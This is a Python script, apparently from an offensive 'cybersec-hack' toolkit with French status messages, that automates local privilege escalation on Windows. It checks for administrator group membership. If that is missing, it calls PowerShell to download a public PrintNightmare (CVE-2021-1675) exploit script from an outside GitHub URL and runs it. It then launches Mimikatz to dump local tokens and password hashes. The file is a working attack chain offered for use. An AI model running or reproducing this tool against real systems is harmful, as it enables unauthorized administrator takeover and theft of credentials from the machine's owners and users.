# cybersec-hack/priv_esc.py

import subprocess
import os

def check_admin_rights():
    try:
        output = subprocess.check_output('whoami /groups', shell=True, text=True)
        if 'S-1-5-32-544' in output or 'Administrators' in output:
            print("[✓] Déjà administrateur local.")
            return True
        else:
            print("[-] Pas encore admin local. Tentative d'escalade...")
            return False
    except Exception as e:
        print(f"[!] Erreur pendant la vérification des droits : {e}")
        return False

def run_printnightmare():
    print("[*] Tentative avec PrintNightmare...")
    try:
        subprocess.call(["powershell", "-c", "Invoke-WebRequest https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/main/CVE-2021-1675.ps1 -OutFile exploit.ps1; .\exploit.ps1"])
    except Exception as e:
        print(f"[!] PrintNightmare échoué : {e}")

def run_mimikatz_local():
    print("[*] Lancement de Mimikatz pour recherche de tokens et hash locaux...")
    try:
        subprocess.call(["tools/mimikatz/mimikatz.exe"], shell=True)
    except Exception as e:
        print(f"[!] Erreur Mimikatz : {e}")

def main():
    print("[+] Module d'escalade de privilège locale initialisé.")
    admin = check_admin_rights()

    if not admin:
        run_printnightmare()
        print("[*] Re-vérification des privilèges...")
        if check_admin_rights():
            print("[✓] Élévation réussie !")
        else:
            print("[✘] Élévation échouée. Essayer manuellement.")

    run_mimikatz_local()

if __name__ == '__main__':
    main()
